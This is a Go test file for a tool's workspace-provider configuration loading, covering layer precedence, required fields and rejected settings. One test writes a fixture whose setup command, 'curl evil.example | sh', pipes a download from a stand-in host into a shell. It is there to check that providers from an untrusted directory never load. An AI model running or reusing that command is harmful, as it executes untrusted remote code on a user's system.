package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestLoadWorkspaceProviders_GlobalLayer(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "workspaces", "github.toml"), `
match = '^https://github\.com/'
name  = "x"
setup = "echo '{\"workspace_dir\":\"/tmp/x\"}'"
cleanup = "true"
`)
	cfg := &Config{BaseDir: baseDir}
	got, err := cfg.LoadWorkspaceProviders()
	if err != nil {
		t.Fatal(err)
	}
	p, ok := got["github"]
	if !ok {
		t.Fatalf("expected github workspace provider, got %+v", got)
	}
	if !p.HasResolver() || p.Setup == "" || p.Cleanup == "" {
		t.Errorf("fields lost: %+v", p)
	}
}

func TestLoadWorkspaceProviders_GlobalOverridesPlugin(t *testing.T) {
	pluginDir := t.TempDir()
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(pluginDir, "config", "workspaces", "github.toml"), `
setup = "echo plugin"
`)
	writeFile(t, filepath.Join(baseDir, "workspaces", "github.toml"), `
setup = "echo global"
`)
	cfg := &Config{BaseDir: baseDir, PluginDirs: []string{pluginDir}}
	got, err := cfg.LoadWorkspaceProviders()
	if err != nil {
		t.Fatal(err)
	}
	if got["github"].Setup != "echo global" {
		t.Errorf("Setup = %q, want global to win (deeper layer)", got["github"].Setup)
	}
}

func TestLoadWorkspaceProviders_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
	pluginA := t.TempDir()
	pluginB := t.TempDir()
	writeFile(t, filepath.Join(pluginA, "config", "workspaces", "github.toml"), `setup = "echo a"`)
	writeFile(t, filepath.Join(pluginB, "config", "workspaces", "github.toml"), `setup = "echo b"`)
	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}

	_, err := cfg.LoadWorkspaceProviders()
	if err == nil || !strings.Contains(err.Error(), "github") {
		t.Fatalf("expected a same-id-across-plugin-layers error naming \"github\", got %v", err)
	}
}

func TestLoadWorkspaceProviders_SetupRequired(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "workspaces", "broken.toml"), `
cleanup = "true"
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadWorkspaceProviders()
	if err == nil || !strings.Contains(err.Error(), "setup") {
		t.Fatalf("expected setup-required error, got %v", err)
	}
}

func TestLoadWorkspaceProviders_ResolverPairEnforced(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "workspaces", "half.toml"), `
match = '^x'
setup = "echo '{}'"
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadWorkspaceProviders()
	if err == nil || !strings.Contains(err.Error(), "together") {
		t.Fatalf("expected resolver-pair error, got %v", err)
	}
}

func TestLoadWorkspaceProviders_WorkspaceDirMutableIsLoadError(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "workspaces", "evil.toml"), `
setup = "echo '{}'"

[outputs_schema.properties.workspace_dir]
type    = "string"
mutable = true
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadWorkspaceProviders()
	if err == nil || !strings.Contains(err.Error(), "reserved") {
		t.Fatalf("expected reserved-workspace_dir error, got %v", err)
	}
}

func TestLoadWorkspaceProviders_NotInWorkspaceDirCascade(t *testing.T) {
	// Workspace providers are trusted-base-layer only — a workspaces/ dir
	// inside a workspace-dir overlay chain must never be picked up.
	// LoadWorkspaceProviders takes no workspace-dir argument by design; this
	// guards against someone re-adding it.
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workspaces", "evil.toml"), `
setup = "curl evil.example | sh"
`)
	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	got, err := cfg.LoadWorkspaceProviders()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := got["evil"]; ok {
		t.Fatal("workspace-dir-layer workspace provider must never load")
	}
}

func TestLoadWorkflows_WorkspaceProviderRedeclarationRejected(t *testing.T) {
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	globalDir := filepath.Join(tmpHome, ".config", "plect")
	if err := os.MkdirAll(globalDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(globalDir, "config.toml"), []byte(""), 0o644); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(globalDir, "workflows", "shared.toml"), `
workspace_provider = "github"

[[nodes]]
id = "g"
`)
	repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
workspace_provider = "gitlab"

[[nodes]]
id = "r"
`)
	workspaceDirPath := filepath.Join(repoDir, "session")
	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
		t.Fatal(err)
	}
	cfg, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	_, err = cfg.LoadWorkflows(workspaceDirPath)
	if err == nil || !strings.Contains(err.Error(), "workspace_provider") {
		t.Fatalf("expected workspace_provider redeclaration error, got %v", err)
	}
}
